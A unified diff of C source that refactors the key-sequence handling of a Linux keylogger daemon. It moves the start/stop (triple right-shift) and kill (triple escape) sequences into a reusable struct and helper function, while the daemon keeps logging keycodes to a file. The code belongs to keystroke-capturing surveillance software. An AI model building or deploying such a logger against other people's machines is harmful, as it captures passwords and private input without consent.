@@ -97,19 +97,30 @@ void log_key(int fd, unsigned short code)
     write(fd, &c, 1);
 }
 
-/*
- * The sequence of keys to start and stop the key logger
- */
-static unsigned short start_stop_seq[] = {
-    KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
+struct seq {
+    unsigned short *keys;
+    unsigned short size;
+    unsigned short index;
 };
 
-/*
- * The sequence of keys to kill the keylogger daemon
- */
-static unsigned short kill_seq[] = {
-    KEY_ESC, KEY_ESC, KEY_ESC
-};
+static bool has_seq_triggered(unsigned short ev_code,
+                              struct seq *seq)
+{
+    bool seq_triggered = false;
+
+    if (ev_code == seq->keys[seq->index]) {
+        seq->index++;
+
+        if (seq->index == seq->size) {
+            seq->index = 0;
+            seq_triggered = true;
+        }
+    } else {
+        seq->index = 0;
+    }
+
+    return seq_triggered;
+}
 
 void keyloggerd(cmd_args_t cmd_args)
 {
@@ -140,8 +151,32 @@ void keyloggerd(cmd_args_t cmd_args)
     ssize_t n;
     int log_fd = create_log(cmd_args);
 
-    int ss_k = 0; /* start/stop sequence index */
-    int kill_k = 0; /* kill sequence index */
+    /*
+     * The sequence of keys to start and stop the key logger
+     */
+    static unsigned short start_stop_keys[] = {
+        KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
+    };
+
+    /*
+     * The sequence of keys to kill the keylogger daemon
+     */
+    static unsigned short kill_keys[] = {
+        KEY_ESC, KEY_ESC, KEY_ESC
+    };
+
+    struct seq start_stop_seq = {
+        .keys = start_stop_keys,
+        .size = ARRAY_SIZE(start_stop_keys),
+        .index = 0
+    };
+
+    struct seq kill_seq = {
+        .keys = kill_keys,
+        .size = ARRAY_SIZE(kill_keys),
+        .index = 0
+    };
+
     bool log_key_enabled = true;
 
     while (1) {
@@ -153,31 +188,19 @@ void keyloggerd(cmd_args_t cmd_args)
                     log_key(log_fd, ev.code);
                 }
 
-                if (ev.code == start_stop_seq[ss_k]) {
-                    ss_k++;
+                if (has_seq_triggered(ev.code, &start_stop_seq)) {
+                    log_key_enabled = !log_key_enabled;
 
-                    if (ss_k == ARRAY_SIZE(start_stop_seq)) {
-                        log_key_enabled = !log_key_enabled;
-
-                        if (log_key_enabled) {
-                            logger.warn("Key logging enabled");
-                        } else {
-                            logger.warn("Key logging disabled");
-                        }
+                    if (log_key_enabled) {
+                        logger.warn("Key logging enabled");
+                    } else {
+                        logger.warn("Key logging disabled");
                     }
-                } else {
-                    ss_k = 0;
                 }
 
-                if (ev.code == kill_seq[kill_k]) {
-                    kill_k++;
-
-                    if (kill_k == ARRAY_SIZE(kill_seq)) {
-                        logger.warn("Magic kill switch sequence pressed");
-                        break;
-                    }
-                } else {
-                    kill_k = 0;
+                if (has_seq_triggered(ev.code, &kill_seq)) {
+                    logger.warn("Magic kill switch sequence pressed");
+                    break;
                 }
             }
         } else {
